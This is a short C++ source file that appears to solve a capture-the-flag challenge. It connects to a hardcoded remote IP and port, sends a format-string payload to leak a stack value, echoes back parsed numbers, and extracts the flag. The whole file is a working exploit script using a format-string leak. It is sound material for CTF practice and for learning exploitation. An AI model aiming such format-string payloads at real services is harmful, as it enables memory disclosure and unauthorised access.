#define _CRT_SECURE_NO_WARNINGS
#include<iostream>
#include"Tube.h"
#include"FormatStringBuilder.h"
using namespace std;

string RE0_main() {
	FSBuilder aa; aa.read(18, type::INTEGER);
	RemoteSession a = remote("111.230.240.83", 2333);
	a.recv();
	a.sendline(aa.result());
	Sleep(1000);
	int aasdfasd = 2;
	while (aasdfasd--) {
		string temp = a.recv();
		int faa = 0;
		while (!isdigit(temp[faa]))faa++;
		sscanf(temp.substr(faa).c_str(), "%d", &faa);
		a.sendline(to_string(faa));
		Sleep(1000);
	}
	string flag = a.recv();
	flag = flag.substr(0, flag.find("}") + 1);
	return flag;
}